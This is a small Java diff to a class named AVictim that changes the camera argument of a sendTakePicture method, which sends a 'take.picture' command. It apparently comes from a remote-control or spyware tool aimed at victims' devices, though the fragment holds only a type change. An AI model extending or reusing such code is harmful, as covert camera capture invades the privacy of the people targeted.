@@ -40,7 +40,7 @@ public class AVictim extends Victim {
         sendMessage(query);
     }
 
-    public void sendTakePicture(String camera, String owner) {
+    public void sendTakePicture(long camera, String owner) {
         JSONObject query = new JSONObject();
         query.put("action", "take.picture");
         query.put("camera", camera);
